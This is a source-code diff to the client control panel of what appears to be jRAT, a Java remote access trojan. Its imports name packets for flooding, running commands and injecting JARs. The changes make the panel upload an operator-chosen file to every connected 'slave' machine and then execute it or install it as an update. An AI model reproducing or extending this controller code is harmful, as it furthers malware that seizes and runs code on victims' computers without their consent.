@@ -45,10 +45,12 @@ import se.jrat.client.packets.outgoing.Packet22Flood;
 import se.jrat.client.packets.outgoing.Packet36Uninstall;
 import se.jrat.client.packets.outgoing.Packet37RestartJavaProcess;
 import se.jrat.client.packets.outgoing.Packet38RunCommand;
+import se.jrat.client.packets.outgoing.Packet42ServerUploadFile;
 import se.jrat.client.packets.outgoing.Packet45Reconnect;
 import se.jrat.client.packets.outgoing.Packet98InjectJAR;
 import se.jrat.client.settings.Settings;
 import se.jrat.client.settings.SettingsColumns;
+import se.jrat.client.threads.UploadThread;
 import se.jrat.client.ui.Columns;
 import se.jrat.client.ui.components.DefaultJTable;
 import se.jrat.client.ui.dialogs.DialogFileType;
@@ -488,15 +490,21 @@ public class PanelMainClients extends JScrollPane {
 					JFileChooser f = new JFileChooser();
 					f.showOpenDialog(null);
 
-					File file = f.getSelectedFile();
+					final File file = f.getSelectedFile();
 
 					if (file == null) {
 						return;
 					}
 
-					for (AbstractSlave slave : servers) {
-						if (slave instanceof Slave) {
-							((Slave)slave).addToSendQueue(new Packet17DownloadExecute("", Downloadable.getFileExtension(file.getName()), file));
+					for (final AbstractSlave slave : servers) {
+						if (slave instanceof Slave) {						
+							((Slave)slave).addToSendQueue(new Packet42ServerUploadFile(file, file.getName(), true, new UploadThread(null, file.getName(), file) {
+								@Override
+								public void onComplete() {
+									super.onComplete();
+									((Slave) slave).addToSendQueue(new Packet17DownloadExecute(file.getName(), Downloadable.getFileExtension(file.getName()), file));
+								}
+							}));
 						}
 					}
 				}
@@ -519,16 +527,22 @@ public class PanelMainClients extends JScrollPane {
 					JFileChooser f = new JFileChooser();
 					f.showOpenDialog(null);
 
-					File file = f.getSelectedFile();
+					final File file = f.getSelectedFile();
 
 					if (file == null) {
 						return;
 					}
 
-					for (AbstractSlave slave : servers) {
+					for (final AbstractSlave slave : servers) {
 						
-						if (slave instanceof Slave) {
-							((Slave)slave).addToSendQueue(new Packet18Update(file));
+						if (slave instanceof Slave) {							
+							((Slave)slave).addToSendQueue(new Packet42ServerUploadFile(file, file.getName(), true, new UploadThread(null, file.getName(), file) {
+								@Override
+								public void onComplete() {
+									super.onComplete();
+									((Slave) slave).addToSendQueue(new Packet18Update(file));
+								}
+							}));
 						}
 					}
 				}
